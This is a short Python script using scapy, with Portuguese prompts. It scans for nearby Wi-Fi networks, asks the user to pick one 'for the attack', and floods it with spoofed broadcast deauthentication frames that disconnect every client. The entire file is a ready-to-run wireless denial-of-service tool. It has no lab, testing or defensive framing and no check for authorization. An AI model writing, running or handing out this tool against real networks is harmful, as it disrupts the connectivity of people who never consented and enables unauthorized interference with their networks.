from scapy.all import *
import os

def get_wifi_networks(interface=None):
    networks = []
    scan_result = []

    if interface is None:
        for iface_name in get_if_list():
            iface = get_if_raw(iface_name)
            if "wlan" in iface_name:
                interface = iface_name
                break

        if interface is None:
            print("Nenhuma interface Wi-Fi encontrada.")
            return networks

    try:
        scan_result = sniff(iface=interface, timeout=10, prn=lambda x: x.summary())
    except KeyboardInterrupt:
        pass

    for packet in scan_result:
        if packet.haslayer(Dot11Beacon):
            essid = packet[Dot11Elt].info.decode()
            bssid = packet[Dot11].addr3
            if essid not in [net[0] for net in networks]:
                networks.append((essid, bssid))
    return networks

def deauth_all_devices(target_bssid, iface=None, count=100):
    if iface is None:
        iface = conf.iface

    deauth_packet = (
        RadioTap()
        / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid)
        / Dot11Deauth()
    )
    sendp(deauth_packet, iface=iface, count=count, inter=0.1)

if __name__ == "__main__":
    print("Escaneando redes WI-FI ao redor...")
    wifi_networks = get_wifi_networks()
    
    if wifi_networks:
        os.system("clear")
        
        print("Redes WI-FI encontradas:")
        for idx, (essid, bssid) in enumerate(wifi_networks, start=1):
            print(f"{idx}. ESSID: {essid}, BSSID: {bssid}")

        try:
            selected_option = int(input("ID da rede para o ataque: "))
            if 1 <= selected_option <= len(wifi_networks):
                selected_bssid = wifi_networks[selected_option - 1][1]
                print(f"Realizando o deauth na rede com BSSID: {selected_bssid}")
                deauth_all_devices(selected_bssid)
                print("Deauth enviado para todos os dispositivos na rede.")
            else:
                print("Opção inválida.")
        except ValueError:
            print("Entrada inválida. Por favor, insira um número.")
    else:
        print("O scan não identificou redes.")
